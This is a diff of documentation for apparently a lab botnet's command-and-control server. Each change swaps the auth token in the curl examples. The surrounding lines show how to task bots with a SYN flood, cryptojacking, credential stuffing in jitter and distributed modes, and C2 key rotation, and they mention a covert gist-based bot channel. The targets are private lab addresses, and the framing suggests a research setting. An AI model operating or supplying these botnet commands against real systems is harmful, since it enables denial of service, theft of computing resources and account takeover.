@@ -615,7 +615,7 @@ sudo ./bot_agent
 # Push tasks (from any VM with curl)
 curl -X POST http://192.168.100.10:5000/task \
      -H "Content-Type: application/json" \
-     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -H "X-Auth-Token: aw" \
      -d '{"bot_id":"all","type":"syn_flood","target_ip":"192.168.100.20","target_port":80,"duration":15}'
 
 # Available task types and their type-specific optional fields:
@@ -638,20 +638,20 @@ curl -X POST http://192.168.100.10:5000/task \
 # Cryptojack at 40% CPU for 60 s:
 curl -X POST http://192.168.100.10:5000/task \
      -H "Content-Type: application/json" \
-     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -H "X-Auth-Token: aw" \
      -d '{"bot_id":"all","type":"cryptojack","duration":60,"cpu":0.40}'
 
 # Credential stuffing in jitter mode:
 curl -X POST http://192.168.100.10:5000/task \
      -H "Content-Type: application/json" \
-     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -H "X-Auth-Token: aw" \
      -d '{"bot_id":"all","type":"cred_stuffing","target_ip":"192.168.100.20",
           "target_port":80,"duration":120,"mode":"jitter","jitter":500}'
 
 # Credential stuffing in distributed mode:
 curl -X POST http://192.168.100.10:5000/task \
      -H "Content-Type: application/json" \
-     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -H "X-Auth-Token: aw" \
      -d '{"bot_id":"all","type":"cred_stuffing","target_ip":"192.168.100.20",
           "target_port":80,"duration":120,"mode":"distributed","workers":3}'
 
@@ -670,7 +670,7 @@ curl http://192.168.100.10:5000/bots
 # Note: /result is POST-only; GET returns 405
 curl -X POST http://192.168.100.10:5000/result \\
      -H "Content-Type: application/json" \\
-     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \\
+     -H "X-Auth-Token: aw" \\
      -d '{"bot_id":"bot_hostname_1234","result":"task complete"}'
 
 # Debug endpoint: test AES round-trip on any JSON payload
@@ -879,7 +879,7 @@ python3 covert_bot.py gist '{"type":"idle"}'
 # Rotate via C2 server (queues update_secret to all Phase 1 bots):
 curl -X POST http://192.168.100.10:5000/rotate_key \
      -H "Content-Type: application/json" \
-     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -H "X-Auth-Token: aw" \
      -d '{"secret":"NEW_KEY_2026_XYZ"}'
 # Returns: {"status":"rotated","bots_notified":N,"new_key_hex":"..."}
 
